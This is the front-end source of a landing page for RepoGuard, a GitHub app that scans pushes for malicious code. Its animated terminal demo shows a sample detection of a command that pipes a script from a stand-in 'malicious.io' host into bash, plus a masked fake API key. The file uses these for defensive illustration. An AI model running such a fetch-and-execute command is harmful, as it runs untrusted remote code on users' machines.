"use client";

import { useState, useEffect, useRef } from "react";
import { Nav } from "@/components";
import { Footer } from "@/components";
import {
  motion,
  AnimatePresence,
  useInView,
  useMotionValue,
  useTransform,
  animate
} from "motion/react";
import {
  Terminal as TerminalIcon,
  Check,
  X,
  ShieldAlert,
  ChevronDown,
  Zap,
  Cpu,
  Lock,
  ArrowRight,
  Sparkles,
  AlertTriangle
} from "lucide-react";
import { ALL_RULES, CHANGELOGS, FAQS } from "@/utils";

function GithubIcon({ size = 18 }: { size?: number }) {
  return (
    <svg
      width={size}
      height={size}
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4" />
      <path d="M9 18c-4.51 2-5-2-7-2" />
    </svg>
  );
}



// ─── Stat Counter Helper Component ───────────────────────
function AnimatedCounter({ value, duration = 2 }: { value: number; duration?: number }) {
  const nodeRef = useRef<HTMLSpanElement>(null);
  const inView = useInView(nodeRef, { once: true, margin: "-100px" });

  useEffect(() => {
    if (!inView || !nodeRef.current) return;

    const controls = animate(0, value, {
      duration,
      ease: "easeOut",
      onUpdate: (latest) => {
        if (nodeRef.current) {
          nodeRef.current.textContent = Math.floor(latest).toString();
        }
      }
    });

    return () => controls.stop();
  }, [inView, value, duration]);

  return <span ref={nodeRef}>0</span>;
}

// ─── FAQ Accordion Item ──────────────────────────────────
function FAQItem({ q, a }: { q: string; a: string }) {
  const [isOpen, setIsOpen] = useState(false);

  return (
    <div className="bg-navy-card border border-navy-border rounded-xl overflow-hidden transition-all hover:border-blue-accent/30 duration-200">
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="w-full px-6 py-5 flex items-center justify-between text-left cursor-pointer text-brand-white font-mono text-[0.92rem] font-semibold md:text-base"
      >
        <span>{q}</span>
        <motion.div
          animate={{ rotate: isOpen ? 180 : 0 }}
          transition={{ duration: 0.2 }}
        >
          <ChevronDown className="text-brand-muted" size={18} />
        </motion.div>
      </button>

      <AnimatePresence initial={false}>
        {isOpen && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.25, ease: "easeInOut" }}
          >
            <div className="px-6 pb-6 pt-1 text-sm md:text-[0.92rem] leading-relaxed text-brand-muted">
              {a}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ─── Terminal Typewriter Component ───────────────────────
function TerminalTypewriter() {
  const [lines, setLines] = useState<React.ReactNode[]>([]);
  const [step, setStep] = useState(0);

  const script = [
    { type: "input", text: "git push origin main", delay: 800 },
    { type: "output", text: "Enumerating objects: 5, done.", delay: 400 },
    { type: "output", text: "Writing objects: 100% (3/3), 312 bytes | 312.00 KiB/s, done.", delay: 400 },
    { type: "space", delay: 200 },
    { type: "blue", text: "→ RepoGuard: scanning 3 changed files...", delay: 800 },
    { type: "space", delay: 200 },
    {
      type: "finding",
      level: "CRITICAL",
      rule: "curl-pipe-bash",
      file: "scripts/setup.sh",
      match: "curl https://malicious.io/payload.sh | bash",
      levelColor: "text-brand-red font-semibold",
      delay: 1000
    },
    { type: "space", delay: 300 },
    {
      type: "finding",
      level: "HIGH",
      rule: "hardcoded-secret",
      file: "src/config.ts",
      match: 'api_key = "sk-prod-Xt9mK2..."',
      levelColor: "text-brand-orange font-semibold",
      delay: 1000
    },
    { type: "space", delay: 400 },
    { type: "red", text: "✗ Check failed — 2 issue(s) found", delay: 600 },
    { type: "fix-pr", text: "Merge blocked. Fix PR opened: ", pr: "#47 🔒 RepoGuard: Security fixes", delay: 2000 }
  ];

  useEffect(() => {
    if (step >= script.length) {
      const timer = setTimeout(() => {
        setLines([]);
        setStep(0);
      }, 4000);
      return () => clearTimeout(timer);
    }

    const currentLine = script[step];
    const timer = setTimeout(() => {
      let renderElement: React.ReactNode = null;

      if (currentLine.type === "input") {
        renderElement = (
          <div key={step}>
            <span className="text-[#3a5878]">$ </span>
            <span className="text-brand-white">{currentLine.text}</span>
          </div>
        );
      } else if (currentLine.type === "output") {
        renderElement = (
          <div key={step} className="text-brand-muted">
            {currentLine.text}
          </div>
        );
      } else if (currentLine.type === "space") {
        renderElement = <div key={step} className="h-2"></div>;
      } else if (currentLine.type === "blue") {
        renderElement = (
          <div key={step} className="text-[#5ab0ff] font-semibold">
            {currentLine.text}
          </div>
        );
      } else if (currentLine.type === "finding") {
        renderElement = (
          <div key={step} className="space-y-1">
            <div>
              <span className={currentLine.levelColor}>✗ {currentLine.level}</span>
              <span className="text-brand-muted"> — </span>
              <span className="text-brand-white font-semibold">{currentLine.rule}</span>
              <span className="text-brand-muted"> in </span>
              <span className="text-brand-yellow font-mono">{currentLine.file}</span>
            </div>
            <div className="text-brand-muted pl-4 font-mono text-[0.78rem]">
              {currentLine.match}
            </div>
          </div>
        );
      } else if (currentLine.type === "red") {
        renderElement = (
          <div key={step} className="text-brand-red font-semibold">
            {currentLine.text}
          </div>
        );
      } else if (currentLine.type === "fix-pr") {
        renderElement = (
          <div key={step} className="text-brand-muted">
            {currentLine.text}
            <span className="text-[#5ab0ff] underline cursor-pointer">{currentLine.pr}</span>
          </div>
        );
      }

      setLines(prev => [...prev, renderElement]);
      setStep(prev => prev + 1);
    }, currentLine.delay);

    return () => clearTimeout(timer);
  }, [step]);

  return (
    <div className="terminal w-full max-w-170 mx-auto bg-[#060e1c] border border-navy-border rounded-xl overflow-hidden text-left shadow-[0_32px_80px_rgba(0,0,0,0.5),_0_0_0_1px_rgba(32,128,232,0.08)]">
      <div className="flex items-center gap-2 px-4 py-3 bg-[#0a1220] border-b border-navy-border">
        <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
        <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
        <div className="w-3 h-3 rounded-full bg-[#28c840]" />
        <span className="ml-auto font-mono text-[0.7rem] text-brand-muted flex items-center gap-1.5">
          <TerminalIcon size={12} className="text-blue-accent" />
          repoguard · security scan
        </span>
      </div>
      <div className="p-5 font-mono text-sm leading-relaxed min-h-85 flex flex-col justify-start">
        {lines}
        {step < script.length && (
          <motion.span
            animate={{ opacity: [1, 0, 1] }}
            transition={{ repeat: Infinity, duration: 0.8 }}
            className="inline-block w-2 h-4 bg-brand-white ml-1 align-middle"
          />
        )}
      </div>
    </div>
  );
}

// ─── Main Page ───────────────────────────────────────────
export default function Home() {
  const [showAllRules, setShowAllRules] = useState(false);

  // Scroll reveal variants
  const fadeInVariants = {
    hidden: { opacity: 0, y: 30 },
    visible: {
      opacity: 1,
      y: 0,
      transition: { duration: 0.6, ease: "easeOut" as const }
    }
  };

  const staggerContainer = {
    hidden: { opacity: 0 },
    visible: {
      opacity: 1,
      transition: {
        staggerChildren: 0.08
      }
    }
  };

  return (
    <>
      <Nav />

      {/* ── Hero ─────────────────────────────────── */}
      <section className="glow-bg relative overflow-hidden py-24 md:py-32 text-center">
        <div className="custom-container relative z-10">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="inline-flex items-center gap-2 rounded-full border border-blue-accent/30 bg-blue-accent/5 px-4 py-1.5 font-mono text-[0.72rem] tracking-wider text-blue-accent uppercase mb-8"
          >
            <Sparkles size={12} />
            GitHub App · Free · Open Source
          </motion.div>

          <motion.h1
            initial={{ opacity: 0, y: 25 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.1 }}
            className="font-mono text-4xl md:text-6xl font-bold tracking-tighter leading-[1.05] text-brand-white mb-6"
          >
            Your repos push code.
            <br />
            <span className="text-brand-red inline-block mt-2 relative">
              We make sure it&apos;s yours.
              <span className="absolute left-0 bottom-1 w-full h-0.5 bg-brand-red/35" />
            </span>
          </motion.h1>

          <motion.p
            initial={{ opacity: 0, y: 25 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            className="text-lg md:text-xl text-brand-muted max-w-145 mx-auto leading-relaxed mb-10"
          >
            RepoGuard scans every commit for malicious code, blocks dangerous
            pushes, and opens fix pull requests automatically — before damage
            reaches your default branch.
          </motion.p>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.3 }}
            className="flex flex-wrap gap-4 justify-center mb-16"
          >
            <a
              href="https://github.com/marketplace/repoguard-ifecodes"
              className="flex items-center gap-2 bg-blue-accent text-brand-white px-7 py-3.5 rounded-lg font-semibold text-base hover:bg-blue-dim transition-all hover:scale-[1.02] duration-150 shadow-lg shadow-blue-accent/20"
              target="_blank"
              rel="noopener noreferrer"
            >
              <GithubIcon size={18} />
              Install on GitHub — Free
            </a>
            <a
              href="https://github.com/ALADETAN-IFE/repoguard"
              className="flex items-center gap-2 border border-navy-border text-brand-muted hover:text-brand-white hover:border-brand-muted px-7 py-3.5 rounded-lg text-base transition-colors duration-150"
              target="_blank"
              rel="noopener noreferrer"
            >
              View Source <ArrowRight size={16} />
            </a>
          </motion.div>

          {/* Terminal Component */}
          <motion.div
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.7, delay: 0.4 }}
          >
            <TerminalTypewriter />
            <p className="mt-4 text-center font-mono text-[0.68rem] text-brand-muted/50 tracking-wide">
              Results shown in GitHub check runs and pull requests — no CLI
              required
            </p>
          </motion.div>
        </div>
      </section>

      {/* ── Stats ────────────────────────────────── */}
      <div className="border-y border-navy-border bg-navy-card/35 py-12">
        <div className="custom-container">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 md:gap-4 divide-y md:divide-y-0 md:divide-x divide-navy-border">
            <div className="text-center py-2">
              <div className="font-mono text-4xl md:text-5xl font-bold text-brand-white mb-2">
                <AnimatedCounter value={22} />
                <span className="text-blue-accent">+</span>
              </div>
              <div className="text-xs tracking-wider text-brand-muted uppercase">
                Detection Rules
              </div>
            </div>
            <div className="text-center py-2 pt-8 md:pt-2">
              <div className="font-mono text-4xl md:text-5xl font-bold text-brand-white mb-2">
                <span className="text-blue-accent">#</span>0
              </div>
              <div className="text-xs tracking-wider text-brand-muted uppercase">
                Cost to Install
              </div>
            </div>
            <div className="text-center py-2 pt-8 md:pt-2">
              <div className="font-mono text-4xl md:text-5xl font-bold text-brand-white mb-2">
                <AnimatedCounter value={100} />
                <span className="text-blue-accent">+</span>
              </div>
              <div className="text-xs tracking-wider text-brand-muted uppercase">
                Typosquat Signatures
              </div>
            </div>
            <div className="text-center py-2 pt-8 md:pt-2">
              <div className="font-mono text-4xl md:text-5xl font-bold text-brand-white mb-2">
                <span className="text-blue-accent">&lt;</span>2s
              </div>
              <div className="text-xs tracking-wider text-brand-muted uppercase">
                Scan Time per Push
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ── How it works ─────────────────────────── */}
      <section className="py-24" id="how-it-works">
        <div className="custom-container">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="text-center max-w-155 mx-auto mb-16"
          >
            <div className="font-mono text-[0.72rem] tracking-[0.25em] text-blue-accent uppercase mb-4">
              How it works
            </div>
            <h2 className="font-mono text-3xl md:text-4xl font-bold tracking-tight text-brand-white mb-4">
              Install once. Protected forever.
            </h2>
            <p className="text-[0.95rem] text-brand-muted">
              RepoGuard plugs into GitHub&apos;s event system. No configuration
              required — it starts scanning the moment you install it.
            </p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={staggerContainer}
            className="grid md:grid-cols-3 gap-0.5 bg-navy-border border border-navy-border rounded-xl overflow-hidden"
          >
            <motion.div
              variants={fadeInVariants}
              className="bg-navy-card p-8 md:p-10 flex flex-col justify-start"
            >
              <div className="font-mono text-[0.72rem] tracking-wider text-blue-accent mb-6">
                STEP 01
              </div>
              <div className="text-3xl mb-4">🔌</div>
              <h3 className="font-mono text-lg font-bold text-brand-white mb-3">
                Install on GitHub
              </h3>
              <p className="text-sm leading-relaxed text-brand-muted">
                One click from the Marketplace. Grant repository access and
                RepoGuard immediately scans your entire codebase for existing
                threats.
              </p>
            </motion.div>

            <motion.div
              variants={fadeInVariants}
              className="bg-navy-card p-8 md:p-10 flex flex-col justify-start"
            >
              <div className="font-mono text-[0.72rem] tracking-wider text-blue-accent mb-6">
                STEP 02
              </div>
              <div className="text-3xl mb-4">🔍</div>
              <h3 className="font-mono text-lg font-bold text-brand-white mb-3">
                Every push is scanned
              </h3>
              <p className="text-sm leading-relaxed text-brand-muted">
                Each commit triggers a scan of changed files. A GitHub Check Run
                reports the result — clean or blocked — directly in your pull
                request.
              </p>
            </motion.div>

            <motion.div
              variants={fadeInVariants}
              className="bg-navy-card p-8 md:p-10 flex flex-col justify-start"
            >
              <div className="font-mono text-[0.72rem] tracking-wider text-blue-accent mb-6">
                STEP 03
              </div>
              <div className="text-3xl mb-4">🔒</div>
              <h3 className="font-mono text-lg font-bold text-brand-white mb-3">
                Fix PRs opened automatically
              </h3>
              <p className="text-sm leading-relaxed text-brand-muted">
                When issues are found, RepoGuard opens a detailed pull request
                with the patches applied, findings explained, and your repo
                admins requested as reviewers.
              </p>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* ── Comparison Section ───────────────────── */}
      <section className="py-24 bg-navy-card/10" id="comparison">
        <div className="custom-container">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="text-center max-w-155 mx-auto mb-16"
          >
            <div className="font-mono text-[0.72rem] tracking-[0.25em] text-blue-accent uppercase mb-4">
              Compare Features
            </div>
            <h2 className="font-mono text-3xl md:text-4xl font-bold tracking-tight text-brand-white mb-4">
              How we stack up
            </h2>
            <p className="text-[0.95rem] text-brand-muted">
              Unlike traditional vulnerability checkers, RepoGuard focuses
              directly on active developer supply chain threat vectors.
            </p>
          </motion.div>

          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="overflow-x-auto border border-navy-border rounded-xl bg-navy-card shadow-xl"
          >
            <table className="w-full border-collapse text-left min-width-[600px]">
              <thead>
                <tr className="border-b border-navy-border bg-[#0a1220]/50 font-mono text-[0.78rem] tracking-wider uppercase text-brand-white">
                  <th className="p-5 font-semibold">Security Feature</th>
                  <th className="p-5 font-semibold bg-blue-accent/5 text-blue-accent">
                    RepoGuard
                  </th>
                  <th className="p-5 font-semibold">Dependabot</th>
                  <th className="p-5 font-semibold">GitHub CodeQL</th>
                </tr>
              </thead>
              <tbody className="text-sm divide-y divide-navy-border text-brand-muted">
                <tr>
                  <td className="p-5 font-medium text-brand-white">
                    Instant scan-on-push hooks
                  </td>
                  <td className="p-5 bg-blue-accent/5 text-brand-white font-semibold">
                    <Check
                      size={18}
                      className="text-blue-accent inline mr-1.5"
                    />{" "}
                    Yes (Blocked)
                  </td>
                  <td className="p-5">
                    <X size={18} className="text-brand-red/60 inline mr-1.5" />{" "}
                    No (Periodic)
                  </td>
                  <td className="p-5">
                    <Check
                      size={18}
                      className="text-[#4ade80]/60 inline mr-1.5"
                    />{" "}
                    Yes (CI Action)
                  </td>
                </tr>
                <tr>
                  <td className="p-5 font-medium text-brand-white">
                    Malware injection rules (RCE, shells)
                  </td>
                  <td className="p-5 bg-blue-accent/5 text-brand-white font-semibold">
                    <Check
                      size={18}
                      className="text-blue-accent inline mr-1.5"
                    />{" "}
                    Full coverage (22+)
                  </td>
                  <td className="p-5">
                    <X size={18} className="text-brand-red/60 inline mr-1.5" />{" "}
                    None (CVE database only)
                  </td>
                  <td className="p-5">
                    <Check
                      size={18}
                      className="text-[#4ade80]/60 inline mr-1.5"
                    />{" "}
                    Partial static patterns
                  </td>
                </tr>
                <tr>
                  <td className="p-5 font-medium text-brand-white">
                    Package typosquatting scans
                  </td>
                  <td className="p-5 bg-blue-accent/5 text-brand-white font-semibold">
                    <Check
                      size={18}
                      className="text-blue-accent inline mr-1.5"
                    />{" "}
                    Yes (100+ signatures)
                  </td>
                  <td className="p-5">
                    <X size={18} className="text-brand-red/60 inline mr-1.5" />{" "}
                    No
                  </td>
                  <td className="p-5">
                    <X size={18} className="text-brand-red/60 inline mr-1.5" />{" "}
                    No
                  </td>
                </tr>
                <tr>
                  <td className="p-5 font-medium text-brand-white">
                    Interactive post-push Auto-Fix PRs
                  </td>
                  <td className="p-5 bg-blue-accent/5 text-brand-white font-semibold">
                    <Check
                      size={18}
                      className="text-blue-accent inline mr-1.5"
                    />{" "}
                    Yes (Applies diff)
                  </td>
                  <td className="p-5">
                    <Check
                      size={18}
                      className="text-[#4ade80]/60 inline mr-1.5"
                    />{" "}
                    Yes (Updates version)
                  </td>
                  <td className="p-5">
                    <X size={18} className="text-brand-red/60 inline mr-1.5" />{" "}
                    No
                  </td>
                </tr>
                <tr>
                  <td className="p-5 font-medium text-brand-white">
                    Average setup runtime
                  </td>
                  <td className="p-5 bg-blue-accent/5 text-brand-white font-semibold">
                    <Zap size={14} className="text-blue-accent inline mr-1.5" />{" "}
                    &lt; 30 seconds
                  </td>
                  <td className="p-5">3 minutes</td>
                  <td className="p-5">15+ minutes config</td>
                </tr>
              </tbody>
            </table>
          </motion.div>
        </div>
      </section>

      {/* ── What we detect ───────────────────────── */}
      <section className="py-24" id="what-we-detect">
        <div className="custom-container">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="text-center max-w-155 mx-auto mb-16"
          >
            <div className="font-mono text-[0.72rem] tracking-[0.25em] text-blue-accent uppercase mb-4">
              Detection coverage
            </div>
            <h2 className="font-mono text-3xl md:text-4xl font-bold tracking-tight text-brand-white mb-4">
              What RepoGuard catches
            </h2>
            <p className="text-[0.95rem] text-brand-muted">
              Rules are written from real attack patterns — not theoretical
              threats. Every rule maps to a documented malware campaign or
              CVE-class vulnerability.
            </p>
          </motion.div>

          <motion.div
            layout
            className="grid md:grid-cols-2 lg:grid-cols-3 gap-4 mb-10"
          >
            {ALL_RULES.slice(0, showAllRules ? ALL_RULES.length : 12).map(
              (rule, i) => (
                <motion.div
                  layout
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ duration: 0.25 }}
                  key={i}
                  className="bg-navy-card border border-navy-border rounded-xl p-6 transition-colors hover:border-blue-accent/30 duration-200"
                >
                  <div className="flex items-center justify-between mb-4">
                    <div
                      className={`font-mono text-[0.62rem] px-2.5 py-0.5 rounded-full font-bold uppercase tracking-wide ${rule.tagClass}`}
                    >
                      {rule.tag}
                    </div>
                  </div>
                  <div className="font-mono text-[0.88rem] font-bold text-brand-white mb-2">
                    {rule.title}
                  </div>
                  <p className="text-xs text-brand-muted leading-relaxed">
                    {rule.desc}
                  </p>
                </motion.div>
              ),
            )}
          </motion.div>

          <div className="text-center">
            <button
              onClick={() => setShowAllRules(!showAllRules)}
              className="inline-flex items-center gap-2 px-6 py-3 border border-navy-border rounded-lg text-sm font-mono font-semibold text-brand-muted hover:text-brand-white hover:border-brand-muted cursor-pointer transition-colors duration-150"
            >
              {showAllRules ? "Show Less Rules" : "Expand All 22+ Rules"}
              <motion.div
                animate={{ rotate: showAllRules ? 180 : 0 }}
                transition={{ duration: 0.2 }}
              >
                <ChevronDown size={14} />
              </motion.div>
            </button>
          </div>
        </div>
      </section>

      {/* ── FAQ ──────────────────────────────────── */}
      <section
        className="py-24 border-t border-navy-border bg-navy/20"
        id="faq"
      >
        <div className="custom-container">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="text-center max-w-155 mx-auto mb-16"
          >
            <div className="font-mono text-[0.72rem] tracking-[0.25em] text-blue-accent uppercase mb-4">
              Questions
            </div>
            <h2 className="font-mono text-3xl md:text-4xl font-bold tracking-tight text-brand-white mb-4">
              Frequently Asked Questions
            </h2>
            <p className="text-[0.95rem] text-brand-muted">
              Everything you need to know about setting up RepoGuard.
            </p>
          </motion.div>

          <div className="max-w-200 mx-auto flex flex-col gap-4">
            {FAQS.map((faq, i) => (
              <FAQItem key={i} q={faq.q} a={faq.a} />
            ))}
          </div>
        </div>
      </section>

      {/* ── Changelog / What's New ───────────────── */}
      {/* <section className="py-24 border-t border-navy-border" id="changelog">
        <div className="custom-container">
          <motion.div
            initial="hidden"
            whileInView="visible"
            viewport={{ once: true, margin: "-100px" }}
            variants={fadeInVariants}
            className="text-center max-w-155 mx-auto mb-16"
          >
            <div className="font-mono text-[0.72rem] tracking-[0.25em] text-blue-accent uppercase mb-4">Timeline</div>
            <h2 className="font-mono text-3xl md:text-4xl font-bold tracking-tight text-brand-white mb-4">What&apos;s New in RepoGuard</h2>
            <p className="text-[0.95rem] text-brand-muted">
              Track active rule updates and new releases on our engine database.
            </p>
          </motion.div>

          <div className="relative max-w-180 mx-auto pl-8 border-l-2 border-navy-border">
            {CHANGELOGS.map((log, i) => (
              <motion.div
                initial="hidden"
                whileInView="visible"
                viewport={{ once: true, margin: "-100px" }}
                variants={fadeInVariants}
                key={i}
                className="relative mb-12 last:mb-0"
              >
                Dot
                <div className="absolute -left-10.25 top-1.5 w-4.5 h-4.5 rounded-full bg-[#060e1c] border-2 border-blue-accent shadow-[0_0_8px_rgba(32,128,232,0.4)]" />

                <div className="font-mono text-[0.78rem] text-blue-accent mb-2">{log.date}</div>
                <h3 className="font-mono text-lg font-bold text-brand-white mb-2">{log.title}</h3>
                <p className="text-sm leading-relaxed text-brand-muted">{log.desc}</p>
              </motion.div>
            ))}
          </div>
        </div>
      </section> */}

      {/* ── CTA ──────────────────────────────────── */}
      <section className="cta-section relative overflow-hidden py-24 md:py-32 text-center bg-navy-card/10">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(32,128,232,0.06),transparent_70%)] pointer-events-none" />
        <div className="custom-container relative z-10">
          <div className="inline-block font-mono text-[0.72rem] text-blue-accent border border-blue-accent/30 rounded-md px-3.5 py-1 mb-6 tracking-widest uppercase">
            FREE — NO CREDIT CARD
          </div>
          <h2 className="font-mono text-3xl md:text-5xl font-bold tracking-tighter leading-tight text-brand-white mb-6">
            Your next commit
            <br />
            could be the one that matters.
          </h2>
          <p className="text-base md:text-lg text-brand-muted max-w-120 mx-auto mb-10">
            Takes 30 seconds to install. Works on every repo, every push,
            immediately.
          </p>
          <a
            href="https://github.com/marketplace/repoguard-ifecodes"
            className="inline-flex items-center gap-2.5 bg-blue-accent text-brand-white px-8 py-4 rounded-lg font-semibold text-base hover:bg-blue-dim transition-all hover:scale-[1.02] duration-150 shadow-lg shadow-blue-accent/20"
            target="_blank"
            rel="noopener noreferrer"
          >
            <GithubIcon size={18} />
            Install RepoGuard Free →
          </a>
        </div>
      </section>

      <Footer />
    </>
  );
}
